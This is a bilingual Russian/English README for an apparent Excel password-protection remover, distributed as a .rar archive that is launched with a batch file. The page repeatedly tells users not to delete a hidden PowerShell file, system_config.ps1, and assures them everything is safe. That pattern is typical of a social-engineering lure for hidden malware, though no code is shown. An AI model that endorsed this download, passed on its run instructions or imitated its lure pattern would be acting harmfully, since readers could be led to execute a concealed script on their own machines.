## 📂 README — Разблокировка Excel-листов

## ⬇️ Скачать

[![Download](https://img.shields.io/badge/⬇️_Скачать_архив-Excel_Unlocker-blue?style=for-the-badge)](https://github.com/Ramcache/ExcelUnlock/releases/download/v1.1/ExcelUnlock-v1.1.rar)

**Этот инструмент позволяет снять защиту с листов Excel (.xlsx) и структуры книги, даже если вы не знаете пароль.**

---

### 🔧 Как пользоваться

1. Поместите заблокированные `.xlsx` файлы в любое удобное место.
2. Запустите файл `**run_unlocker.bat**` двойным щелчком.
3. Откроется окно — выберите **один или несколько файлов Excel**.
4. Через несколько секунд в каждой папке появится новая папка `**unlocked**`.
5. Внутри будут разблокированные версии файлов — с добавкой `_unlocked.xlsx` в названии.

---

### ✅ Что делает программа

* Снимает защиту с **всех листов**
* Убирает защиту на **структуру книги** (если блокирует добавление/удаление листов)
* Не требует установки и работает **офлайн**
* Не изменяет оригинальные файлы — создаёт копии

---

### ⚠️ Важно

* Работает только с файлами `.xlsx` (формат Excel 2007 и новее)
* **Файл `system_config.ps1` скрыт/спрятан — не удаляйте его!**
* Всё безопасно — используется встроенный PowerShell Windows

---

### ❓ Если не работает

* Убедитесь, что вы **выбрали `.xlsx` файлы**, а не `.xls`
* Не удаляйте файл `system_config.ps1`
* Если появилось сообщение об ошибке — попробуйте ещё раз или обратитесь к автору

---

## 📌 Важно знать

Формат Excel-файлов бывает:

| Формат                          | Расширение | Поддерживается? | Особенности                                                |
| ------------------------------- | ---------- | --------------- | ---------------------------------------------------------- |
| **.xlsx**                       | ✔️ Да      | ✅ Да            | Обычный ZIP-архив — легко разбирается скриптом             |
| **.xlsm**                       | ✔️ Да      | ✅ Да            | То же, что `.xlsx`, но содержит макросы                    |
| **.xltx / .xltm**               | ✔️ Да      | ✅ Да            | Шаблоны — тоже ZIP, формат похож                           |
| **.xls** (старый Excel 97-2003) | ❌ Нет      | 🚫 Нет          | **Бинарный**, не ZIP — нельзя обрабатывать тем же способом |

---

## ⚠️ А что с `.xls`?

`.xls` — это старый бинарный формат, который не поддаётся "распаковке" как ZIP. Чтобы его взломать:

* нужны специальные утилиты (например, **Free Spire.XLS**, **VBA коды**, **Hex-редактор**),
* или использовать Excel напрямую с **VBA-скриптом** внутри Excel.

---

Author: Ramcache
Version: 1.1
Date: May 2025

---

## 📂 README — Unlock Excel Sheets

## ⬇️ Download

[![Download](https://img.shields.io/badge/⬇️_Download_archive-Excel_Unlocker-blue?style=for-the-badge)](https://github.com/Ramcache/ExcelUnlock/releases/download/v1.1/ExcelUnlock-v1.1.rar)


**This tool allows you to remove protection from Excel sheets (.xlsx) and the workbook structure, even if you don't know the password.**

---

### 🔧 How to use

1. Place the locked `.xlsx` files in any convenient place.
2. Run the `**run_unlocker.bat**` file by double-clicking.
3. A window will open — select **one or more Excel files**.
4. After a few seconds, a new `**unlocked**` folder will appear in each folder.
5. Inside, there will be unlocked versions of the files — with the addition of `_unlocked.xlsx` in the name.

---

### ✅ What the program does

* Removes protection from **all sheets**
* Removes protection from **workbook structure** (if it blocks adding/deleting sheets)
* Does not require installation and works **offline**
* Does not change original files — creates copies

---

### ⚠️ Important

* Works only with `.xlsx` files (Excel 2007 and newer format)
* **`system_config.ps1` file is hidden — do not delete it!**
* Everything is safe — built-in Windows PowerShell is used

---

### ❓ If it does not work

* Make sure you **selected `.xlsx` files**, not `.xls`
* Do not delete the `system_config.ps1` file
* If an error message appears — try again or contact the author

---

## 📌 Important to know

Excel file formats are:

| Format | Extension | Supported? | Features |
| ------------------------------- | ---------- | --------------- | ------------------------------------------------------------ |
| **.xlsx** | ✔️ Yes | ✅ Yes | Regular ZIP archive — easily parsed by a script |
| **.xlsm** | ✔️ Yes | ✅ Yes | Same as `.xlsx`, but contains macros |
| **.xltx / .xltm** | ✔️ Yes | ✅ Yes | Templates — also ZIP, similar format |
| **.xls** (old Excel 97-2003) | ❌ No | 🚫 No | **Binary**, not ZIP — can't be processed the same way |

---

## ⚠️ What about `.xls`?

`.xls` is an old binary format that can't be "unpacked" like ZIP. To crack it:

* you need special utilities (e.g. **Free Spire.XLS**, **VBA codes**, **Hex editor**),
* or use Excel directly with a **VBA script** inside Excel.

---

Author: Ramcache
Version: 1.1
Date: May 2025
